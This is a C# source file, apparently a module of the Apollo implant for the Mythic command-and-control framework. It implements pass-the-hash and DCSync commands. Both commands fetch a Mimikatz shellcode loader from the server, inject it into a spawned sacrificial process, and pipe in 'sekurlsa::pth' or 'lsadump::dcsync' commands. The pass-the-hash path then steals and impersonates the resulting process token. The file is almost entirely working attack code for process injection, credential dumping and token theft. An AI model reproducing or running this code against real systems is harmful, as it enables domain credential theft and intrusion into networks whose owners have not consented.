#define COMMAND_NAME_UPPER

#if DEBUG
#undef PTH
#undef DCSYNC
#define PTH
#define DCSYNC
#endif

#if PTH

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Reflection = System.Reflection;
using Apollo.Jobs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.IO.Pipes;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using System.Diagnostics;
using System.IO;
using IPC;
using Apollo.Tasks;
using Apollo.Evasion;
using Mythic.Structs;
using Apollo.Credentials;
using System.Windows.Forms;
using System.Runtime.InteropServices;

using static Utils.StringUtils;
using static Native.Methods;
using static Native.Enums;
using static Native.Structures;
using System.Security;
using System.Security.Principal;

namespace Apollo.CommandModules
{
#if PTH
    public struct PassTheHashParameters
    {
        public MythicCredential credential;
        public string program;
        public string loader_stub_id;
        public string pipe_name;
    }
#endif
#if DCSYNC
    public struct DCSyncParameters
    {
        public string domain;
        public string user;
        public string loader_stub_id;
        public string pipe_name;
    }
#endif
    class MimikatzWrappers
    {

        /// <summary>
        /// Execute an arbitrary C# assembly in a sacrificial process
        /// that respects the current caller's token.
        /// </summary>
        /// <param name="job">
        /// Job associated with this task. job.Task.parameters
        /// should contain a JSON structure with key "assembly" that
        /// has an associated Apfell file ID to pull from the server.
        /// This assembly is position-independent code generated from
        /// donut with arguments baked in.
        /// </param>
        /// <param name="agent">Agent this task is run on.</param>
        public static void Execute(Job job, Agent implant)
        {
            Task task = job.Task;
            switch (task.command)
            {
#if PTH
                case "pth":
                    PassTheHash(job, implant);
                    break;
#endif
#if DCSYNC
                case "dcsync":
                    DCSync(job, implant);
                    break;
#endif
                default:
                    job.SetError("Unsupported code path.");
                    break;
            }
        }

#if PTH
        public static void PassTheHash(Job job, Agent implant)
        {
            Task task = job.Task;
            PassTheHashParameters taskParams;
            string sacrificialApplication;
            string commandLine = "";
            string command = "\"sekurlsa::pth /user:{0} /domain:{1} /ntlm:{2} /run:{3}\"";
            string loaderStubID;
            string pipeName;
            int pidOfPTHProccess = -1;
            JObject json;
            List<string> output = new List<string>();
            MythicCredential cred;
            try
            {
                taskParams = JsonConvert.DeserializeObject<PassTheHashParameters>(job.Task.parameters);
            }
            catch (Exception ex)
            {
                job.SetError($"Error deserializing task parameters. Malformed JSON. System exception: {ex.Message}\n\nTask Parameters:\n{task.parameters}");
                return;
            }
            cred = taskParams.credential;


            if (string.IsNullOrEmpty(cred.account) || string.IsNullOrEmpty(cred.credential))
            {
                job.SetError("Username and password are required for pth.");
                return;
            }

            if (cred.credential_type != "hash")
            {
                job.SetError($"pth built-in can only be used with hash-type (e.g., RC4 or NTLM) credentials, and was given credentials of type {cred.credential_type}");
                return;
            }


            string userFQDN = cred.account;
            if (string.IsNullOrEmpty(cred.realm))
            {
                job.SetError("pth requires a valid realm or domain to be set.");
                return;
            }

            command = string.Format(command, new object[] { cred.account, cred.realm, cred.credential, taskParams.program });
            byte[] loaderStub;

            /*
             * Response from the server should be of the form:
             * {
             * "assembly_name": "registered assembly name",
             * "loader_stub_id": "File ID of the loader stub",
             * "pipe_name": "named pipe to connect to",
             * "assembly_arguments": "command line arguments to send",
             * }
             */
            //ProcessWithAnonymousPipeIO sacrificialProcess = null;
            SacrificialProcesses.SacrificialProcess sacrificialProcess = null;
            

            // Reset the loader stub each time as a new named pipe is given to us from on high.
            loaderStub = null;
            try
            {
                loaderStub = implant.Profile.GetFile(task.id, taskParams.loader_stub_id, implant.Profile.ChunkSize);
            }
            catch (Exception ex)
            {
                job.SetError($"Failed to fetch loader stub for Mimikatz. Reason: {ex.Message}.\nParameters:\n{task.parameters}");
                return;
            }
            if (loaderStub == null || loaderStub.Length == 0)
            {
                job.SetError(String.Format("Unable to retrieve DLL shellcode stub with ID {0}", taskParams.loader_stub_id));
                return;
            }

            pipeName = taskParams.pipe_name;
            if (string.IsNullOrEmpty(pipeName))
            {
                job.SetError("No pipe name was given to DLL to start the named pipe server.");
                return;
            }

            if (implant.architecture == "x64")
                sacrificialApplication = EvasionManager.SpawnTo64;
            else
                sacrificialApplication = EvasionManager.SpawnTo86;

            try
            {
                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(sacrificialApplication, commandLine, true);

                if (sacrificialProcess.Start())
                {
                    job.ProcessID = (int)sacrificialProcess.PID;
                    job.sacrificialProcess = sacrificialProcess;
                    ApolloTaskResponse response;

                    if (sacrificialProcess.Inject(loaderStub))
                    {
                        //sacrificialProcess.CreateNewRemoteThread(tempBytes);
                        //sacrificialProcess.ResumeThread();
                        // bool bRet = sacrificialProcess.StillActive();
                        NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);

                        pipeClient.Connect(30000);

                        StreamWriter writer;
                        try
                        {
                            writer = new StreamWriter(pipeClient);
                            writer.Write(command);
                            writer.Flush();
                            using (StreamReader sr = new StreamReader(pipeClient))
                            {
                                //sr.ReadLine();
                                var line = sr.ReadLine();
                                while (line != null && line.ToUpper().Trim() != "EOF")
                                {
                                    if (line.Contains(" PID "))
                                    {
                                        string[] parts = line.Trim().Split(' ');
                                        if (parts.Length != 5)
                                        {
                                            job.SetError($"No PID could be enumerated from the line: {line}");
                                            break;
                                        } else
                                        {
                                            if (!int.TryParse(parts[4].Trim(), out pidOfPTHProccess))
                                            {
                                                job.SetError($"Failed to parse PID from: {parts[1].Trim()}");
                                                break;
                                            }
                                        }
                                    }
                                    output.Add(line);
                                    line = sr.ReadLine();
                                }
                            }
                            if (pipeClient.IsConnected)
                                writer.Close();

                            if (output.Count > 0)
                            {
                                job.AddOutput(output.ToArray());
                                output.Clear();
                            }
                        }
                        catch (Exception ex)
                        {
                            job.SetError(String.Format("Error while reading from stream: {0}", ex.Message));
                        }

                        if (pidOfPTHProccess != -1)
                        {
                            IntPtr procHandle;
                            IntPtr hStolenToken;
                            try
                            {
                                procHandle = System.Diagnostics.Process.GetProcessById((int)Convert.ToInt32(pidOfPTHProccess)).Handle;

                            }
                            catch (Exception ex)
                            {
                                throw new Exception($"Failed to acquire handle to process {pidOfPTHProccess}. Reason: {ex.Message}");
                            }

                            // Stores the handle for the original process token
                            hStolenToken = IntPtr.Zero; // Stores the handle for our duplicated token

                            // Get handle to target process token
                            bool bRet = OpenProcessToken(
                                procHandle,                                 // ProcessHandle
                                (uint)(TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary | TokenAccessLevels.Query),     // desiredAccess
                                out IntPtr tokenHandle);                           // TokenHandle

                            if (!bRet)
                            {
                                throw new Exception($"Failed to open process token: {Marshal.GetLastWin32Error()}");
                                //return;
                            }// Check if OpenProcessToken was successful

                            if (!CredentialManager.SetImpersonatedPrimaryToken(tokenHandle))
                            {
                                throw new Exception($"Failed to set new primary token: {Marshal.GetLastWin32Error()}");
                            }

                            
                            // Duplicate token as stolenHandle
                            bRet = DuplicateTokenEx(
                                tokenHandle,                                    // hExistingToken
                                TokenAccessLevels.MaximumAllowed, /*.TOKEN_QUERY | TokenAccessRights.TOKEN_DUPLICATE | TokenAccessRights.TOKEN_ASSIGN_PRIMARY,*/         // dwDesiredAccess
                                IntPtr.Zero,                                    // lpTokenAttributes
                                TokenImpersonationLevel.Impersonation,    // ImpersonationLevel
                                TOKEN_TYPE.TokenImpersonation,         // TokenType
                                out hStolenToken);                              // phNewToken


                            // end testing
                            if (!bRet) // Check if DuplicateTokenEx was successful
                            {
                                throw new Exception($"Failed to duplicate token handle: {Marshal.GetLastWin32Error()}");
                            }

                            ////bRet = ImpersonateLoggedOnUser(tokenHandle);
                            //if (!bRet)
                            //{
                            //    task.status = "error";
                            //    task.message = $"Failed to impersonate logged on user: {Marshal.GetLastWin32Error()}";
                            //}


                            //CloseHandle(tokenHandle);
                            //CloseHandle(procHandle);
                            if (!CredentialManager.SetImpersonatedImpersonationToken(hStolenToken))
                            {
                                throw new Exception($"Failed to impersonate user. Reason: {Marshal.GetLastWin32Error()}");
                            }
                            else
                            {
                                WindowsIdentity ident = new WindowsIdentity(hStolenToken);
                                job.SetComplete($"\n\nSuccessfully impersonated {ident.Name}!");
                                ident.Dispose();
                            }

                        }
                        else
                        {
                            job.SetError("Failed to acquire PID of PTH process.");
                        }
                    }
                    else
                    {
                        job.SetError($"Failed to inject loader stub: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                    }

                }
                else
                {
                    job.SetError($"Failed to start sacrificial process: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception ex)
            {
                if (sacrificialProcess != null)
                {
                    job.SetError(String.Format("Error in PTH (PID: {0}). Reason: {1}", sacrificialProcess.PID, ex.Message));
                }
                else
                {
                    job.SetError(String.Format("Error in PTH. Reason: {0}", ex.Message));
                }
            }
            finally
            {
                if (!sacrificialProcess.HasExited)
                    sacrificialProcess.Kill();
            }
        }
#endif

#if DCSYNC
        public static void DCSync(Job job, Agent implant)
        {
            DCSyncParameters dcsParams;
            Task task = job.Task;
            string command;
            string sacrificialApplication;
            string commandLine = "";
            string loaderStubID;
            string pipeName;
            JObject json;
            List<string> output = new List<string>();
            string formatCommand = "\"lsadump::dcsync /domain:{0} /user:{1}\"";

            dcsParams = JsonConvert.DeserializeObject<DCSyncParameters>(job.Task.parameters);
            if (string.IsNullOrEmpty(dcsParams.domain))
            {
                job.SetError("Missing required parameter: domain");
                return;
            }

            if (string.IsNullOrEmpty(dcsParams.user))
            {
                job.SetError("Missing required parameter: user");
                return;
            }

            if (dcsParams.domain.Split(' ').Length > 1)
            {
                job.SetError($"Invalid domain: {dcsParams.domain}");
                return;
            }
            
            if (dcsParams.user.Split(' ').Length > 1)
            {
                job.SetError($"Invalid user: {dcsParams.user}");
                return;
            }

            command = string.Format(formatCommand, dcsParams.domain, dcsParams.user);

            byte[] loaderStub;

            /*
             * Response from the server should be of the form:
             * {
             * "assembly_name": "registered assembly name",
             * "loader_stub_id": "File ID of the loader stub",
             * "pipe_name": "named pipe to connect to",
             * "assembly_arguments": "command line arguments to send",
             * }
             */
            //ProcessWithAnonymousPipeIO sacrificialProcess = null;
            SacrificialProcesses.SacrificialProcess sacrificialProcess = null;


            // Reset the loader stub each time as a new named pipe is given to us from on high.
            loaderStub = null;
            try
            {
                loaderStub = implant.Profile.GetFile(task.id, dcsParams.loader_stub_id, implant.Profile.ChunkSize);
            }
            catch (Exception ex)
            {
                job.SetError($"Failed to fetch loader stub for Mimikatz. Reason: {ex.Message}.\nParameters:\n{task.parameters}");
                return;
            }
            if (loaderStub == null || loaderStub.Length == 0)
            {
                job.SetError(String.Format("Unable to retrieve DLL shellcode stub with ID {0}", dcsParams.loader_stub_id));
                return;
            }

            pipeName = dcsParams.pipe_name;
            if (string.IsNullOrEmpty(pipeName))
            {
                job.SetError("No pipe name was given to DLL to start the named pipe server.");
                return;
            }

            if (implant.architecture == "x64")
                sacrificialApplication = EvasionManager.SpawnTo64;
            else
                sacrificialApplication = EvasionManager.SpawnTo86;

            try
            {
                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(sacrificialApplication, commandLine, true);

                if (sacrificialProcess.Start())
                {
                    job.ProcessID = (int)sacrificialProcess.PID;
                    job.sacrificialProcess = sacrificialProcess;
                    ApolloTaskResponse response; 
                    
                    if (sacrificialProcess.Inject(loaderStub))
                    {
                        //sacrificialProcess.CreateNewRemoteThread(tempBytes);
                        //sacrificialProcess.ResumeThread();
                        // bool bRet = sacrificialProcess.StillActive();
                        NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);

                        pipeClient.Connect(30000);

                        StreamWriter writer;
                        try
                        {
                            writer = new StreamWriter(pipeClient);
                            writer.Write(command);
                            writer.Flush();
                            using (StreamReader sr = new StreamReader(pipeClient))
                            {
                                //sr.ReadLine();
                                var line = sr.ReadLine();
                                while (line != null && line.ToUpper().Trim() != "EOF")
                                {
                                    output.Add(line);
                                    line = sr.ReadLine();
                                }
                            }
                            if (pipeClient.IsConnected)
                                writer.Close();

                            if (output.Count > 0)
                            {
                                job.SetComplete(output.ToArray());
                            }
                        }
                        catch (Exception ex)
                        {
                            job.SetError(String.Format("Error while reading from stream: {0}", ex.Message));
                        }

                    }
                    else
                    {
                        job.SetError($"Failed to inject loader stub: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                    }

                }
                else
                {
                    job.SetError($"Failed to start sacrificial process: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception ex)
            {
                if (sacrificialProcess != null)
                {
                    job.SetError(String.Format("Error in DCSync (PID: {0}). Reason: {1}", sacrificialProcess.PID, ex.Message));
                }
                else
                {
                    job.SetError(String.Format("Error in DCSync. Reason: {0}", ex.Message));
                }
            }
            finally
            {
                if (!sacrificialProcess.HasExited)
                    sacrificialProcess.Kill();
            }

        }
#endif
    }
}
#endif